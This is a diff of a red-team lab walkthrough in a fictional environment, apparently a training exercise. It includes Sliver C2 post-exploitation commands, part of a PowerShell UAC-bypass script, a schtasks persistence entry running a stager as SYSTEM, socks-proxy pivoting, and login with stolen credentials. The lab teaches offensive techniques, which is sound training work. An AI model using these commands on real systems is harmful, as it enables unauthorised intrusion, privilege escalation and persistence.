@@ -253,7 +253,7 @@ Back on evil, check the HTTP Server tab. You should see that there has been a co
 On evil, check the sliver tab. You should now see a new session.
 
 ![Initial Foothold](assets/afterclick.png)
-*Attacking machine/evil: Initial foothold*
+**Attacking machine/evil: Initial foothold**
 You now have an initial foothold!
 
 In the sliver tab let us interact with the current session. The syntax is sessions -i <session name or number>.
@@ -271,7 +271,7 @@ info
 to get some information including the username, machine name, OS and version, SIDs (will be discussed later) and more.
 
 ![Sliver Interaction](assets/sliver-interaction.png)
-
+**Sliver Interaction**
 ### Situational Awareness : Learning about the compromised environment.
 
 You are now in control of garfield's machine. We could essentially do anything he can do on his machine.
@@ -308,7 +308,7 @@ The sliver execute command allows us to run built in windows commands.
 execute -o nltest /dclist:
 ```
 ![nltest](assets/nltest.png)
-**Active Directory Domain Information.
+**Active Directory Domain Information.**
 
 We can see that the machine has joined the Active Directory domain via its domain controller dc01.crueltesting.com. Good to know?
 
@@ -325,7 +325,7 @@ and then check what files there are
 ls
 ```
 ![Todos](assets/TODOs.png)
-
+**Files in Garfield's private TODO folder**
 Now we can read the messages to Garfield from his manager.
 
 Type the following commands in your sliver session (the command cat shows the content of a file, showing feline domination)
@@ -340,7 +340,7 @@ cat mice-management-access.txt
 ```
 cat tomcat-patch.txt
 ```
-![Garfield Work Ahead](assets/garfield-3-TODOS.png)
+![Garfield Work Orders](assets/garfield-3-TODOS.png)
 
 We learn that the he is supposed to reset a service account weekly, we learn about a fileshare with some interesting content (that garfield cannot access yet, because he is not a domain admin) and we learn about a system "tomcat" that needs patching.
 
@@ -373,10 +373,12 @@ Joy! We now hopefully Garfield's domain password.
 
 ### Escalating our Privileges on the compromised client (Bypassing Windows UAC)
 
-As noted above, our privileges are limited - our implant is running with integrity level medium, we want it to be **high**!!!. This is all because of windows UAC.
+As noted above, our privileges are limited - our implant is running with integrity level medium, we want it to be **high**!!!. Unfortunately for us the integrity level is medium because of This is all because of Windows UAC (User Admission Control, which prompts an administrator if he really wants to do this when he tries to execute a potentially dangerous command).
 
 So we are now going to upload a file to Garfield's Desktop to help us bypass the UAC.
-This file is a PowerShell Script and the technique is described in the appendix.
+This file is a PowerShell Script and the technique is described in the appendix A.
+
+In a shell window on Evil, paste the following that create the PowerShell file.
 ```
 cat << 'EOF' > /home/localadmin/LAB/bypass.ps1
 $command = "C:\Users\garfield\Desktop\stager.exe"
@@ -388,6 +390,7 @@ EOF
 ```
 ![Create Bypass file](assets/creating-bypass-file.png)
 **Create powershell script to bypass UAC**
+
 From the sliver window, we can now upload this file
 
 ```
@@ -404,6 +407,10 @@ execute powershell.exe -Command "Set-ExecutionPolicy Bypass -Scope Process -Forc
 **Executing the bypass file**
 
 You should see a new session appear, this one with a higher integrity. Interact with the new session (sessions -i <number>). From the higher integrity session we can schedule a task.
+
+```
+sessions -i <number>
+```
 
 ```
 execute -o schtasks /create /tn "NetworkDiagnostics" /tr "C:\Users\garfield\Desktop\stager.exe" /sc onstart /ru "NT AUTHORITY\SYSTEM" /f
@@ -445,7 +452,7 @@ From sliver session we start the socks proxy:
 socks5 start
 ```
 ![Starting socks proxy](assets/socks5start.png)
-
+**Starting the socks proxy**
 Now we can access internal systems via the socks proxy, we prove that by prepending proxychains
 in front of the previous netcat command
 
@@ -453,7 +460,7 @@ in front of the previous netcat command
 proxychains nc -w 3 -v 10.0.3.6 80
 ```
 ![netcat works through socks proxy](assets/nc-works.png)
-
+**netcat now works through the socks proxy!**
 The command succeeds since we are now using the socks proxy!
 
 We can also use a web browser directly! Start firefox from shell tab with
@@ -469,6 +476,8 @@ You can now use Firefox to surf to internal URLs behing the firewall such as m2.
 http://m2.crueltesting.com
 ```
 ![Mice Management](assets/m2.png)
+**Mice Management website, maybe something we should attack?**
+
 
 This is the application for Mice Control that was mentioned in one of the notes in Garfield's TODOs directory! Good to know that we can reach it even though it though access is blocked by the firewall!
 
@@ -703,12 +712,24 @@ From a firefox browser using the outgoing proxy, access m2.labrats.se.This is th
 
 On evil, open up firefox with proxy settings (remember that we cannot reach m2.crueltesting directly but have to go via proxy)
 
-But you can login with the stolen credentials garfield/Lasagna.
+```
+firefox -P "ProxyProfile" --new-instance &
+```
 
-Then you can free your mice!! At least the ones you own.
+But you can login with the stolen credentials: garfield/Lasagna.
+![Logging in with stolen credentials](assets/m2login.png)
+**Logging in with garfield stolen credentials**
 
+Logged in as garfield you will see a table of different mice, a camera view and actions you can take on a specific mouse. Like inject it with dangerous substances, feed it... But there is also an option to free the mouse!
 
+Choose the mouse rizzy, and click free.
 
+![Freeing the Mouse Rizzy](assets/m2listmice.png)
+**Freeing the mouse Rizzy**
+
+The mouse should now be free, ready to roam around in Cruel Testing lab environment and support our cause!
+
+We have accomplished our mission!
 
 
 ## Lab Conclusion
